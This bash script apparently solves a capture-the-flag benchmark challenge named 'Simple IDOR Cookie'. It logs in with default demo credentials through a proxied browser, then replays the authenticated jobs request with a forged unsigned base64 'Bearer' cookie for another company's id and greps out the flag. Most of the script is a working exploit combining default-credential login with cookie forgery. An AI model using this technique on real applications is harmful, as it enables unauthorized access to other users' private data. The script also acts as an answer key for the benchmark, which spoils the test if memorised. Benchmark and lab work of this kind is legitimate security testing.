#!/usr/bin/env bash
# XBEN-021-24 — "Simple IDOR Cookie" (tags: idor, default_credentials)
#
# Proxy-mode twin of examples/xben/xben-021-idor-cookie.sh. The session cookie
# is `Bearer base64(company_id)` — no signature, nothing to forge around. Log in
# as the demo company through a real Chromium, then replay the authenticated
# jobs request as another company by putting that company's number in the
# cookie. The admin company's jobs include a private one holding the flag.
#
# `cookie.access_token=` edits that one cookie in the captured request rather
# than rewriting the whole Cookie line, so the rest of the session stays intact.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben021p-$$"
cd "$(dirname "$0")"
. ./_proxy-lib.sh
proxy_start "$URL/"

# 1. Log in as the seeded demo account. The login lands on this company's own
#    jobs page — an authenticated request whose identity is entirely the cookie.
go "$URL/"
ab wait '#username' >/dev/null 2>&1 || true
ab fill '#username' demo >/dev/null
ab fill '#password' demo >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --url 'jobs' >/dev/null 2>&1 || true

# 2. Replay that jobs request as company 2: `2` in base64 is the whole forgery.
REQ="$(req_of GET /jobs)"
TOKEN="Bearer $(printf '2' | base64)"
"$H5I" websec replay "$REQ" --session "$SESSION" \
  --set 'path=/company/2/jobs' \
  --set "cookie.access_token=$TOKEN" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
